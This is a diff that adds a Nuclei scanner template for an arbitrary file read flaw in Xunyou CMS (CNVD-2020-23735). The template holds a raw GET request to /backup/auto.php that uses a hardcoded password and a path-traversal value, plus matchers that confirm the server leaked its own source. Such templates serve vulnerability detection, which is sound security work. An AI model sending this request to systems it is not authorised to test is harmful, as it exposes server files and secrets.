@@ -1,0 +1,30 @@
+id: xunyou-cms-file-read-cnvd-2020-23735
+
+info:
+  name: Xunyou CMS Local File Read (CNVD-2020-23735)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Xunyou CMS has an arbitrary file reading vulnerability. Attackers can use vulnerabilities to obtain sensitive information.
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cnvd/CNVD-2020-23735.yaml
+    - https://www.cnvd.org.cn/flaw/show/2025171
+  tags: fileread
+
+variables:
+  filePath: "../backup/auto.php"
+
+http:
+  - raw:
+      - |
+        GET /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path={{{filePath}}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
+      - type: word
+        words:
+          - "$_GET['password']"
